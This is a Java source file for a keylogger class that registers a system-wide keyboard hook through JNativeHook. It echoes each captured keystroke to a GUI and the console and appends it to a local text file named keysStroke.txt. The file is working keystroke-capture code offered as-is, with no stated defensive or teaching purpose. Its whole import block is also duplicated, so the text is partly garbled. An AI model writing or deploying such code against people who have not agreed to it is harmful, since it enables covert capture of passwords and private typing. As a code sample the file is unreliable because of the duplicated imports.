import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.io.IOException;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardOpenOption;
import java.util.logging.Level;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.io.IOException;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardOpenOption;
import java.util.logging.Level;

public class KeyLogger  implements NativeKeyListener{




        private static final Path file = Paths.get("keysStroke.txt"); //Making the log file.
        private static final Logger logger = LoggerFactory.getLogger(KeyLogger.class); //logger
        private int keystorkeLen = 0;

        public void run() {
            logger.info("Key logger has been started");
            init();
            try {
                GlobalScreen.registerNativeHook();
                if (GUI.getRun())
                    GlobalScreen.removeNativeKeyListener(this);
            } catch (NativeHookException e) {
                logger.error(e.getMessage(), e);
                System.exit(-1);
            } catch (RuntimeException e) {

            }
            GlobalScreen.addNativeKeyListener(this);

        }

        private static void init() {

            // Get the package "org.jnativehook" and set the level to warning.
            java.util.logging.Logger logger = java.util.logging.Logger.getLogger(GlobalScreen.class.getPackage().getName());
            logger.setLevel(Level.WARNING);

            //disable the parent handlers.
            logger.setUseParentHandlers(false);
        }

        public void nativeKeyPressed(NativeKeyEvent e) { //When key is pressed
            String keyText = NativeKeyEvent.getKeyText(e.getKeyCode()); // Get the key stroke
            keystorkeLen += keyText.length();
            if (GUI.getRun()) {
                System.out.println(keyText);
                if (keyText.length() > 1) {
                    GUI.updatePrinting("[" + keyText + "]");
                } else {
                    GUI.updatePrinting(keyText);
                }
                if (GUI.getSaveStrokes()) {
                    try (OutputStream os = Files.newOutputStream(file, StandardOpenOption.CREATE, StandardOpenOption.WRITE, StandardOpenOption.APPEND); PrintWriter writer = new PrintWriter(os)) { //Prints it on the keyStroke.txt
                        if (keyText.length() > 1) {
                            writer.print("[" + keyText + "]");
                        } else {
                            writer.print(keyText);
                        }

                    } catch (IOException ex) {
                        logger.error(ex.getMessage(), ex);
                        System.exit(-1);
                    }
                }
            }
        }


        public void nativeKeyReleased(NativeKeyEvent e) { //When key is released
            // Nothing
        }

        public void nativeKeyTyped(NativeKeyEvent e) { //When key is typed (pressed then released)
            // Nothing here
        }

    }

